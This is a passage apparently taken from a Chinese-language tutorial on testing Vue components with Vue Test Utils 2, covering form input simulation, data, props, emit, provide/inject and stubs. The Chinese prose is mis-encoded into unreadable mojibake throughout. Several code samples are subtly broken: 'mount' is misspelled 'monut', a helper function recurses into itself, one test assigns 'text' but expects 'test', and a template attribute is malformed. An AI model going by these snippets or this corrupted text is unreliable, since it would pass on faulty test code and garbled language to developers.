çš„ä¾†å°æ‡‰ checkbox / radio å‹¾é¸ç‹€æ…‹ï¼ˆcheckedï¼‰ï¼›é™¤æ­¤ä¹‹å¤–æ›¿ \u0026lt;select\u0026gt; å…ƒç´ çš„é¸æ“‡æä¾›äº† setSelected æ–¹æ³•ä¾†æ¨¡æ“¬é¸æ“‡è¡Œç‚ºã€‚\nè€Œåœ¨ Vue Test utils 2 ç‰ˆæ™‚ï¼Œæˆ‘å€‘å°‡åªè¦çµ±ä¸€ä½¿ç”¨ setValue å³å¯è‡ªå‹•å°æ‡‰æ‰€æœ‰è¡¨å–®çš„è¡Œç‚ºï¼\næ¨¡æ“¬ input è¼¸å…¥ è¼¸å…¥è¡¨å–®æˆ–æ˜¯æ“ä½œæ—¥æœŸé¸æ“‡å™¨ï¼š\n1 2 3 4 5 6 \u0026lt;template\u0026gt; \u0026lt;input v-model=\u0026#34;textResult\u0026#34; type=\u0026#34;text\u0026#34; data-test=\u0026#34;text\u0026#34;/\u0026gt; \u0026lt;p data-test=\u0026#34;result_text\u0026#34;\u0026gt;{{textResult}}\u0026lt;/p\u0026gt; \u0026lt;input v-model=\u0026#34;dateResult\u0026#34; type=\u0026#34;date\u0026#34; data-test=\u0026#34;date\u0026#34;/\u0026gt; \u0026lt;p data-test=\u0026#34;result_date\u0026#34;\u0026gt;{{dateResult}}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ–‡å­—è¼¸å…¥ï¼š\n1 2 3 4 5 it(\u0026#39;æ¨¡æ“¬ input è¼¸å…¥\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find([data-test=\u0026#34;text\u0026#34;]).setValue(\u0026#39;Hello, World!\u0026#39;) expect(wrapper.find([data-test=\u0026#34;result_text\u0026#34;]).text()).toBe(\u0026#39;Hello, World!\u0026#39;) }) é¸æ“‡æ—¥æœŸï¼š\n1 2 3 4 5 it(\u0026#39;æ¨¡æ“¬ æ—¥æœŸ è¼¸å…¥\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find([data-test=\u0026#34;date\u0026#34;]).setValue(\u0026#39;2022/10/06\u0026#39;) expect(wrapper.find([data-test=\u0026#34;result_date\u0026#34;]).text()).toBe(\u0026#39;2022/10/06\u0026#39;) }) æ¨¡æ“¬ radio å‹¾é¸ å…ƒä»¶ 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;input data-test=\u0026#34;radio_1\u0026#34; type=\u0026#34;radio\u0026#34; v-model=\u0026#34;radioResult\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input data-test=\u0026#34;radio_2\u0026#34; type=\u0026#34;radio\u0026#34; v-model=\u0026#34;radioResult\u0026#34; value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;p data-test=\u0026#34;result\u0026#34;\u0026gt;{{ radioResult }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ¸¬è©¦ç¨‹å¼ç¢¼ 1 2 3 4 5 6 7 it(\u0026#39;æ¨¡æ“¬ radio å‹¾é¸è¡Œç‚º\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;radio_1\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;1\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;radio_2\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;2\u0026#39;) }) æ¨¡æ“¬ checkbox å‹¾é¸ å…ƒä»¶ 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;input data-test=\u0026#34;checkbox_1\u0026#34; type=\u0026#34;checkbox\u0026#34; v-model=\u0026#34;checkboxResult\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input data-test=\u0026#34;checkbox_2\u0026#34; type=\u0026#34;checkbox\u0026#34; v-model=\u0026#34;checkboxResult\u0026#34; value=\u0026#34;2\u0026#34; /\u0026gt; \u0026lt;p data-test=\u0026#34;result\u0026#34;\u0026gt;{{ checkboxResult.join(\u0026#39;,\u0026#39;) }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ¸¬è©¦ç¨‹å¼ç¢¼ 1 2 3 4 5 6 7 8 9 it(\u0026#39;æ¨¡æ“¬ checkbox å‹¾é¸è¡Œç‚º\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;checkbox_1\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;checkbox_2\u0026#34;]\u0026#39;).setValue(true) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;1,2\u0026#39;) await wrapper.find(\u0026#39;[data-test=\u0026#34;checkbox_1\u0026#34;]\u0026#39;).setValue(false) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;2\u0026#39;) }) æ¨¡æ“¬ select é¸æ“‡ å…ƒä»¶ 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;select data-test=\u0026#34;target\u0026#34; v-model=\u0026#34;result\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;orange\u0026#34;\u0026gt;Orange\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;black\u0026#34;\u0026gt;Black\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;p data-test=\u0026#34;result\u0026#34;\u0026gt;{{ result }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; æ¸¬è©¦ç¨‹å¼ç¢¼ 1 2 3 4 5 it(\u0026#39;æ¨¡æ“¬ select é¸æ“‡\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).setValue(\u0026#39;orange\u0026#39;) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;result\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;orange\u0026#39;) }) æ¨¡æ“¬ Vue APIs data æ³¨æ„ï¼šåœ¨æ¨¡æ“¬ data ä¹‹å‰éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å¤§éƒ¨åˆ†çš„æ¸¬è©¦æ™‚æˆ‘å€‘é€šå¸¸ä¸å¿…ç‰¹æ„å»æ¨¡æ“¬ dataï¼Œæ‡‰è©²è®“å…¶èˆ‡å…ƒä»¶æœ¬èº«çš„ç§æœ‰æ–¹æ³•ï¼ˆprivate methodï¼‰è‡ªç„¶äº’å‹•å³å¯ï¼Œè‹¥æœƒéœ€è¦é€éæ¨¡æ“¬ data ä¾†æ“ä½œå…ƒä»¶å‰‡è¦è§€å¯Ÿæ˜¯å¦è³‡æ–™èˆ‡å…ƒä»¶æœ¬èº«è€¦åˆäº†ï¼Œé€™ç¨®æƒ…æ³ä¸‹å¯èƒ½é€ æˆå…ƒä»¶æœ¬èº«ç„¡æ³•é«˜åº¦é‡è¤‡åˆ©ç”¨ã€‚\nç§æœ‰æ–¹æ³•ï¼ˆprivate methodï¼‰ å°é–‰åœ¨å…ƒä»¶ã€ç‰©ä»¶\u0026hellip;ç­‰ç­‰ä¸­çš„å‡½å¼ï¼Œåœ¨å¤–éƒ¨ç„¡æ³•å­˜å–å¾—åˆ°ï¼Œe.gï¼š\n1 2 3 4 5 6 function add5(x){ const add = (x,y,) =\u0026gt; x + y return add5(5, x) } // è£¡é ­çš„ add å‡½å¼å³ç‚ºç§æœ‰æ–¹æ³•ã€‚ è‹¥æ˜¯çœŸçš„æœ‰éœ€è¦ç”¨åˆ°æ¨¡æ“¬ data å±¬æ€§æ™‚ï¼Œé¦–å…ˆè¦æ³¨æ„å…ƒä»¶æ˜¯ç”¨ä½•ç¨®æ–¹å¼ï¼ˆoptions API /composition API èˆ‡ \u0026lt;script setup\u0026gt;ï¼‰ä¾†ä½¿ç”¨ dataï¼Œå› ç‚ºå¯«æ³•ä¸Šå°‡æœƒæœ‰æ‰€ä¸åŒï¼›ä¸”ä¾ç…§è¨­å®šçš„æ™‚æ©Ÿé‚„å¯åˆ†ç‚ºã€Œåˆå§‹ç‹€æ…‹ã€èˆ‡ã€Œå¾ŒçºŒæ“ä½œã€ã€‚\ndataï¼ˆoptions APIï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;template\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ content }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data() { return { content: \u0026#39;\u0026#39; } } } \u0026lt;/script\u0026gt; dataï¼ˆoption APIï¼‰åˆå§‹ç‹€æ…‹æ¨¡æ“¬ï¼Œå¯é€éå®¹å™¨ï¼ˆwrapperï¼‰çš„ç¬¬äºŒå€‹åƒæ•¸å¸¶å…¥ï¼š\n1 2 3 4 5 6 7 8 9 10 /* æ¸¬è©¦ç¨‹å¼ç¢¼ */ const wrapper = mount(component, { data(){ return { content: \u0026#39;test\u0026#39; } } }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;test\u0026#39;) è‹¥è¦æ¨¡æ“¬å¾ŒçºŒæ‰è¨­å®š dataï¼ˆoption APIï¼‰ï¼Œå‰‡å¯ä»¥é€éå®¹å™¨æ–¹æ³•ä¸­çš„ setData() è¨­ç½®ï¼Œæ­¤å¤–ç”±æ–¼æ˜¯éåŒæ­¥çš„æ–¹æ³•ï¼Œè¦è¨˜å¾— async/await æ‰èƒ½ç¢ºä¿æ–·è¨€æ­£ç¢ºï¼š\n1 2 3 4 5 6 7 8 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) await wrapper.setData({ content: \u0026#39;test\u0026#39; }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;test\u0026#39;) }) dataï¼ˆcomposition API, \u0026lt;script setup\u0026gt; èªæ³•ç³–ï¼‰ composition APIï¼š 1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; export default { setup() { const content = ref(\u0026#39;\u0026#39;) return { content } } } \u0026lt;/script\u0026gt; \u0026lt;script setup\u0026gt; èªæ³•ç³–ï¼š 1 2 3 4 \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const content = ref(\u0026#39;\u0026#39;) \u0026lt;/script\u0026gt; é€™ä¸€é¡é€é setup() æ‰€è™•ç†çš„è³‡æ–™ï¼Œè‹¥è¦æ¨¡æ“¬æœƒé‡åˆ°ä¸å°‘å•é¡Œã€‚\nåœ¨å®¹å™¨æ–¹æ³•ä¸­çš„ç¬¬äºŒå€‹åƒæ•¸æ‰€æä¾›çš„æ–¹å¼ï¼ŒåŸå…ˆæ˜¯ä¾›æ‡‰çµ¦ options API ä¸­çš„ data å±¬æ€§æ‰€ä½¿ç”¨ï¼Œæ‰€ä»¥æˆ‘å€‘å¿…é ˆæ”¹ä»¥æ³¨å…¥çš„æ–¹å¼åµŒå…¥ setup()ï¼š\n1 2 3 4 5 6 7 8 /* æ¸¬è©¦ç¨‹å¼ç¢¼ */ const wrapper = monut(component, { setup(){ return { content:\u0026#39;\u0026#39; } } }) ä½†å¦‚æ­¤ä¸€ä¾†ï¼Œå…ƒä»¶ä¸­åŸå…ˆå…¶ä»–å¯«åœ¨ setup() å…§çš„ç‹€æ…‹ç­‰å°±å¿…é ˆä¸€èµ·æ¨¡æ“¬ï¼Œé‚„è¨˜å¾—å¥½çš„å…ƒä»¶æ¸¬è©¦å®ˆå‰‡ä¹‹ä¸€å—ï¼Ÿæ²’éŒ¯ï¼Œå°±æ˜¯ä¸è¦é‡è¤‡å¯¦è¸å¯¦ä½œã€‚\né‚£æ¯”è¼ƒå¥½çš„æ–¹å¼ä¹‹ä¸€å°±æ˜¯é€éå®¹å™¨æ–¹æ³•ä¸­ï¼ˆwrapperï¼‰å–å¾—å¯¦é«”ä¾†è¨­ç½®è®Šæ•¸ï¼Œä¸¦ä¸”é€é nextTick æ–¹æ³•ç¢ºä¿æ¸²æŸ“çµæœï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 it(\u0026#39;...\u0026#39; , async () =\u0026gt; { /* æ¸¬è©¦ç¨‹å¼ç¢¼ */ const wrapper = monut(component) wrapper.vm.content = \u0026#39;text\u0026#39; // ç‰ˆæœ¬1: ç›´æ¥ä½¿ç”¨ vm å…§çš„ $nextTick await wrapper.vm.$nextTick() // ç‰ˆæœ¬2: ä½¿ç”¨ vue çš„ nextTick // import { nextTick } from \u0026#39;vue\u0026#39; // await nextTick() expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;test\u0026#39;) }) è€Œé—œæ–¼ç§æœ‰æ–¹æ³•æˆ–è®Šæ•¸çš„æ¨¡æ“¬ï¼Œæˆ–è¨±å°‡ä¾† Vue Test Utils é–‹ç™¼åœ˜éšŠæœƒå°æ­¤æœ‰äº›æ”¹è§€æä¾›ä¸€äº›é€ƒç”Ÿè‰™çš„æ–¹æ³•ï¼Œä¸éç›®å‰æ¯”è¼ƒä¸€è‡´çš„è§’åº¦æ˜¯ç›¡é‡åˆ¥å°é€™ä¸€é¡çš„ç§æœ‰ç’°å¢ƒæ‰æœ‰çš„è®Šæ•¸èˆ‡æ–¹æ³•å»åšæ¨¡æ“¬ï¼Œå³æ™‚çš„ç›¸é—œè¨è«–å¯è¦‹æ–¼é€™è£¡ã€‚\nprops åœ¨ä¸æ¨¡æ“¬ç§æœ‰æƒ…å¢ƒçš„å‰æä¹‹ä¸‹ï¼Œprop ç›¸è¼ƒèµ·ä¾†å–®ç´”å¤šäº†ï¼Œè€Œé—œæ–¼æ¸¬è©¦ props çš„éƒ¨åˆ†ä¸»è¦æœ‰ï¼š\næ¨¡æ“¬ props å‚³å…¥å¾Œï¼Œæ–·è¨€ã€Œå¾ŒçºŒçš„ç‹€æ…‹ã€ã€‚ æ–·è¨€ã€Œæ˜¯å¦å‚³å…¥å°çš„åƒæ•¸çµ¦å­å…ƒä»¶ã€ã€‚ æ¨¡æ“¬ props å‚³å…¥ è¦æ¨¡æ“¬ props å‚³å…¥çš„æ–¹æ³•ä¾ç…§æ™‚æ©Ÿå¯åˆ†ç‚ºã€Œåˆå§‹ç‹€æ…‹ã€èˆ‡ã€Œå¾ŒçºŒæ“ä½œã€ï¼š\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ content }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; åˆå§‹ç‹€æ…‹åŒæ¨£æ˜¯è—‰ç”±å®¹å™¨ï¼ˆWrapperï¼‰ä¸­çš„ç¬¬äºŒå€‹åƒæ•¸å‚³å…¥ï¼š\n1 2 3 4 5 6 7 8 it(\u0026#39;\u0026#39;, () =\u0026gt; { const wrapper = mount(component, { props: { content: \u0026#39;Hello\u0026#39; } }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;Hello\u0026#39;) }) è‹¥æƒ³è¦å¾ŒçºŒæ‰å‚³å…¥ props å‰‡å¯ä»¥é€éå®¹å™¨æ–¹æ³• setProps æ¨¡æ“¬ï¼Œä¸¦ä¸”ä¸€æ¨£è¦å°å¿ƒéåŒæ­¥çš„å•é¡Œï¼Œè¨˜å¾—è£œä¸Š async / await ï¼š\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(component, { props: { content: \u0026#39;Hello\u0026#39; } }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;Hello\u0026#39;) await wrapper.setProps({ content: \u0026#39;Good bye\u0026#39; }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toEqual(\u0026#39;Good bye\u0026#39;) }) æ–·è¨€æ˜¯å¦å‚³å…¥å° props åƒæ•¸çµ¦å­å…ƒä»¶ æ—¢ç„¶æœ‰æ¥æ”¶çš„ä¸€æ–¹ï¼Œé‚£å°±è‡³å°‘æœƒæœ‰çµ¦äºˆçš„ä¸€æ–¹ã€‚\nåœ¨ props é©—è­‰ä¸­çš„å¦ä¸€ç¨®æ–¹å¼å°±æ˜¯é©—è­‰çµ¦äºˆå…¶ä»–å…ƒä»¶çš„åƒæ•¸æ˜¯å¦æ­£ç¢ºï¼š\n1 2 3 \u0026lt;template\u0026gt; \u0026lt;BaseLightbox content\u0026#34;Hello\u0026#34; enableMask=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/template\u0026gt; é¦–å…ˆæˆ‘å€‘è¦åšçš„æ˜¯é€éä¹‹å‰å­¸çš„é¸æ“‡å™¨æ–¹æ³•é¸åˆ°ç‰¹å®šçš„å…ƒä»¶ï¼Œæ¥è‘—é€éå®¹å™¨æ–¹æ³•åº•ä¸‹çš„ props() ä¾†å–çš„å‚³é€è³‡è¨Šï¼Œæ¥è‘—å°±å¯ä»¥é€éæ–·è¨€ Matcher ä¾†æ¯”å° props çµ¦å…ƒä»¶çš„è³‡è¨Šæ˜¯å¦æ­£ç¢ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 import { BaseLightbox } from \u0026#39;./BaseLightbox.vue\u0026#39; it(\u0026#39;\u0026#39;, async () =\u0026gt; { const wrapper = mount(component) const target = wrapper.get(BaseLightbox) expect(target.props(content)).toEqual(\u0026#39;Hello\u0026#39;) expect(target.props(enableMask)).toEqual(true) expect(target.props()).toEqual({ content: \u0026#39;Hello\u0026#39;, enableMask: true, }) }) emit åœ¨æ–·è¨€ä¸­æˆ‘å€‘è¦æ¸¬è©¦ emit ä¸»è¦æ˜¯è©¦åœ–æ•ç²å…ƒä»¶æ‰€ç™¼ç”Ÿçš„äº‹ä»¶ï¼Œä¸¦æ–·è¨€äº‹ä»¶èˆ‡å€¼æ˜¯å¦å¦‚æˆ‘å€‘æ‰€é æœŸï¼Œè€Œé€™æ™‚å¯ä»¥é€éå®¹å™¨æ–¹æ³•ä¸­çš„ emitted() ä¾†å–å¾—äº‹ä»¶ç™¼é€æ‰€æœ‰çš„ç´€éŒ„ã€‚\nè€Œ emitted ä¸­æ‰€ç´€éŒ„çš„æ ¼å¼å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 { \u0026#39;äº‹ä»¶åç¨±\u0026#39;: [ [/* ç¬¬ä¸€æ¬¡ç™¼é€çš„å€¼ */], [/* ç¬¬äºŒæ¬¡ç™¼é€çš„å€¼ */], [/* ç¬¬ n æ¬¡ç™¼é€çš„å€¼ */] ] } å› æ­¤å‡è¨­æˆ‘å€‘æœ‰ä¸€å€‹ pagination å…ƒä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;div data-test=\u0026#34;first\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;first\u0026#39;)\u0026#34;\u0026gt; ç¬¬ä¸€é  \u0026lt;/div\u0026gt; \u0026lt;div data-test=\u0026#34;prev\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;prev\u0026#39;)\u0026#34;\u0026gt; ä¸Šä¸€é  \u0026lt;/div\u0026gt; \u0026lt;div data-test=\u0026#34;next\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;next\u0026#39;)\u0026#34;\u0026gt; ä¸‹ä¸€é  \u0026lt;/div\u0026gt; \u0026lt;div data-test=\u0026#34;last\u0026#34; @click=\u0026#34;$emit(\u0026#39;changePage\u0026#39;, \u0026#39;last\u0026#39;)\u0026#34;\u0026gt; æœ€å¾Œä¸€é  \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; åœ¨æ–·è¨€çš„æ™‚å€™æˆ‘å€‘å¯ä»¥é€éä¸‹åˆ—æ–¹å¼æª¢æŸ¥æ˜¯å¦ç™¼é€å°æ‡‰çš„ emit äº‹ä»¶ï¼š\né€é toHaveProperty ç¢ºèª emitted å±¬æ€§ç¢ºèªæ˜¯å¦ç™¼é€ã€Œé æœŸäº‹ä»¶åç¨±ã€ é€é emitted().äº‹ä»¶åç¨± ç¢ºèªè©²äº‹ä»¶åç¨±ã€Œç™¼ç”Ÿæ¬¡æ•¸ã€ é€é emitted().äº‹ä»¶åç¨±[index] ç¢ºèªè©²äº‹ä»¶åç¨±ï¼Œç¬¬å¹¾æ¬¡é€å‡ºçš„ã€Œå€¼ã€ 1 2 3 4 5 6 7 8 9 it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) await wrapper.find(\u0026#39;[data-test=\u0026#34;first\u0026#34;]\u0026#39;).trigger(\u0026#39;click\u0026#39;) expect(wrapper.emitted()).toHaveProperty(\u0026#39;changePage\u0026#39;) expect(wrapper.emitted().changePage).toHaveLength(1) expect(wrapper.emitted().changePage[0]).toEqual([\u0026#39;first\u0026#39;]) }) provide å°æ–¼æœ‰ä½¿ç”¨åˆ° provide çš„å…ƒä»¶ä¾†èªªï¼Œæˆ‘å€‘éœ€è¦ç¢ºä¿ä»–æä¾›é æœŸçš„ inject å…§å®¹ï¼Œå› æ­¤æˆ‘å€‘è¦å»ºç«‹ä¸€å€‹ç”¨ä¾†æ¥æ”¶ provide çš„å…ƒä»¶ï¼Œæ¥è‘—æ‰èƒ½é€éæ–·è¨€ä¾†æ¸¬è©¦å‚³éçš„å…§å®¹æ˜¯å¦å¦‚é æœŸã€‚\næ¥ä¸‹ä¾†æˆ‘å€‘ä»¥é€™å€‹å…ƒä»¶ç‚ºä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ChildComponent /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, provide, readonly } from \u0026#39;vue\u0026#39; export default { setup() { const count = ref(1) provide(\u0026#39;count\u0026#39;, readonly(count)) }, } \u0026lt;/script\u0026gt; ç„¶è€Œæˆ‘å€‘ç‚ºäº†è®“æ¸¬è©¦æ¡ˆä¾‹ä¿æŒç¨ç«‹æ€§ï¼Œå› æ­¤æˆ‘å€‘è¦é€éé€ å‡çš„å…ƒä»¶ä¾†æ¸¬è©¦ inject æ‰€æ¥æ”¶åˆ°çš„æ˜¯å¦å¦‚é æœŸã€‚\né€éå…ƒä»¶å®¹å™¨ä¸­çš„ global.stubs æ¨¡æ“¬å‡å…ƒä»¶ é€éå…ƒä»¶å®¹å™¨ï¼ˆWrapperï¼‰ä¸­çš„ç¬¬äºŒå€‹åƒæ•¸ global.stubs æˆ‘å€‘å¯ä»¥å°‡å­å…ƒä»¶æ¸²æŸ“æˆæˆ‘å€‘æƒ³è¦çš„æ¨£å­ï¼Œè€Œæ¨¡æ“¬çš„æ–¹å¼ä¸€å…±åˆ†ç‚ºå…©ç¨®ï¼š\næ¸²æŸ“æˆ \u0026lt;-stub\u0026gt; å…ƒä»¶ ç•¶ global.stub[ç›®æ¨™å…ƒä»¶åç¨±] ç‚º true æ™‚ï¼š\n1 2 3 4 5 6 7 const wrapper = mount(TargetComponent, { global: { stubs: { ChildComponent: true, }, }, }) æˆ‘å€‘çš„ç›®æ¨™å…ƒä»¶å°‡æœƒè¢«æ¸²æŸ“ç‚ºå¸¶æœ‰ -stub å¾Œç¶´çš„å…ƒç´ ï¼š\n1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;ChildComponent /\u0026gt; \u0026lt;!-- æœƒè®Šæˆ \u0026lt;child-component-stub\u0026gt;\u0026lt;/child-component-stub\u0026gt; --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; ç„¶è€Œé€™å°æ–¼æˆ‘å€‘è¦æ¸¬è©¦ provide ä¾†èªªæ²’æœ‰å¹«åŠ©ï¼Œå› ç‚ºä»–æ²’æœ‰è¾¦æ³•æ¥æ”¶ inject è³‡è¨Šï¼Œå› æ­¤æˆ‘å€‘è¦æ¡ç”¨ä¸‹é¢ç¬¬äºŒç¨®æ–¹æ³•ã€‚\næ¸²æŸ“æˆç‰¹å®šå…ƒä»¶ è¦æ¸²æŸ“æˆç‰¹å®šå…ƒä»¶çš„æ–¹å¼ï¼Œå°±æ˜¯å…ˆè£½ä½œä¸€å€‹å‡å…ƒä»¶ï¼Œæ¥è‘—å†æä¾›çµ¦ global.stubs ä¾†ç•¶ä½œåŸå…ˆæ‡‰è©²è¦æ¸²æŸ“çš„å…ƒä»¶ã€‚\né¦–å…ˆï¼Œæˆ‘å€‘å¯ä»¥é€é Vue æä¾›çš„ defineComponent å»ºé€ å…ƒä»¶ï¼š\n1 2 3 4 5 6 7 8 9 import { defineComponent } from \u0026#39;vue\u0026#39; const TestComponent = defineComponent({ template: \u0026#39;\u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt;\u0026#39;, setup() { const value = inject(\u0026#39;count\u0026#39;) return { value } }, }) æ¥è‘—åœ¨æ¸¬è©¦æ¡ˆä¾‹å°±å¯ä»¥é€é global.stubs ä¸­ç›´æ¥ä½¿ç”¨é€™å€‹æ¸¬è©¦å…ƒä»¶ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import { defineComponent } from \u0026#39;vue\u0026#39; const TestComponent = defineComponent({ template: \u0026#39;\u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt;\u0026#39;, setup() { const value = inject(\u0026#39;count\u0026#39;) return { value } }, }) it(\u0026#39;...\u0026#39; , () =\u0026gt; { const wrapper = mount(TargetComponent, { global: { stubs: { ChildComponent: TestComponent, }, }, }) }) å¦‚æ­¤ä¸€ä¾†å…ƒä»¶ ChildComponent åœ¨æ¸¬è©¦æ¡ˆä¾‹ä¸­çš„æ¸²æŸ“çµæœå°‡è®Šæˆæˆ‘å€‘æŒ‡å®šçš„æ¨£å­ã€‚\n1 2 3 \u0026lt;div\u0026gt; \u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;1\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; å› æ­¤æˆ‘å€‘ç¾åœ¨å°±å¯ä»¥æ–·è¨€ provide æä¾›çš„å…§å®¹æ˜¯å¦æ­£ç¢ºäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 const TestComponent = defineComponent({ template: \u0026#39;\u0026lt;p data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/p\u0026gt;\u0026#39;, setup() { const count = inject(\u0026#39;count\u0026#39;) return { count } }, }) it(\u0026#39;...\u0026#39;, async () =\u0026gt; { const wrapper = mount(TargetComponent, { global: { stubs: { ChildComponent: TestComponent, }, }, }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) }) inject å°æ–¼æœ‰ä½¿ç”¨åˆ° inject çš„å…ƒä»¶ä¾†èªªï¼Œæˆ‘å€‘åœ¨æ„çš„æ˜¯æä¾› provide ç‰¹å®šçš„å€¼ä¹‹å¾Œï¼Œç•«é¢ä¸Šæ¸²æŸ“çš„çµæœæ˜¯å¦æ­£ç¢ºã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div data-test=\u0026#34;target\u0026#34;\u0026gt;{{ count }}\u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { inject } from \u0026#39;vue\u0026#39; export default { setup() { const count = inject(\u0026#39;count\u0026#39;) return { count } }, } \u0026lt;/script\u0026gt; æ­¤æ™‚æˆ‘å€‘å¯ä»¥é€éå…ƒä»¶å®¹å™¨ï¼ˆWrapperï¼‰ä¸­çš„ç¬¬äºŒå€‹åƒæ•¸ global ä¾†æŒ‡å®šè¦æä¾›çš„ provide å€¼ï¼š\n1 2 3 4 5 6 7 const wrapper = mount(TargetComponent, { global: { provide: { count: 1, }, }, }) æœ€å¾Œæˆ‘å€‘å°±å¯ä»¥ç›´æ¥æ–·è¨€æ¸²æŸ“çš„çµæœæ˜¯å¦å¦‚é æœŸï¼š\n1 2 3 4 5 6 7 8 9 10 11 it(\u0026#39;should be render correct content after providing count\u0026#39;, async () =\u0026gt; { const wrapper = mount(TargetComponent, { global: { provide: { count: 1, }, }, }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).text()).toBe(\u0026#39;1\u0026#39;) }) slots è€Œåœ¨é‡å° slots æ’°å¯«æ¸¬è©¦æ™‚ï¼Œè¦æ³¨æ„çš„åœ°æ–¹æœ‰ï¼š\nslots è‡³å°‘æœƒæœ‰é 